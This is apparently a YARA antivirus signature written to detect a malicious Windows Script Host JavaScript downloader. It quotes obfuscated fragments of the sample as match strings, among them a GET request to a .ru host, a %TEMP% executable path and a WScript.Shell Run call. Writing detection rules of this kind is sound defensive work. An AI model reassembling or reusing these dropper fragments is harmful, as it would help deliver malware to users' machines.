rule sig_20160401_558758bd430263cb8f712bc380cbdad9 {
  meta:
    description = "datamaliciousorder - file 20160401_558758bd430263cb8f712bc380cbdad9.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "27009d73cedf0ad75cca39ec26bd3294de2e67b3a3b267d536b4aa05ee0f4d8c"

  strings:
    $s1  = "var JbaAbm = function ZspFc() {return WScript[VeCic](\"WScript\"+\".Shell\");}(), DzEa = 11;" fullword ascii
    $s2  = "function ShDxm(GhWa, BpZxu){DumRcz = DumRcz * 1; return GhWa - BpZxu;};" fullword ascii
    $s3  = "VwLl[FezCmr](\"G\" + \"ET\", \"http://teamlight-pro.ru/j7esp\", false);" fullword ascii
    $s4  = "if (VwLl[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function CsKvs() {return JbaAbm[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"yybiSuJemS9U.ex\" + \"e\";};" fullword ascii
    $s6  = "function MpZu(){return BnTb + \"\";};" fullword ascii
    $s7  = "function LuPti() {return ((BkrNbb == true) && (BkrNbb == ZqOs)) ? 1 : DumRcz;};" fullword ascii
    $s8  = "var CjeRdj = false;" fullword ascii
    $s9  = "var BkrNbb = false;" fullword ascii
    $s10 = "ZqOs = true; " fullword ascii
    $s11 = "BkrNbb = true; " fullword ascii
    $s12 = "return ShDxm(IkFgr, FgoFy);" fullword ascii
    $s13 = "function DwrHc()" fullword ascii
    $s14 = "var EaApt = new this[\"Date\"]();" fullword ascii
    $s15 = "function MhuHvt(OlzCfr){JbaAbm[\"R\"+\"un\"](OlzCfr, DumRcz, DumRcz);};" fullword ascii
    $s16 = "function ToKqy(){return 23;};" fullword ascii
    $s17 = "var ZqOs = false;" fullword ascii
    $s18 = "function FwJd(XuHg) {var MsxGcv = (1, 2, 3, 4, 5, XuHg); return MsxGcv;};" fullword ascii
    $s19 = "function VsjCsq(){return VeCic;};" fullword ascii
    $s20 = "}while (HyRx);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}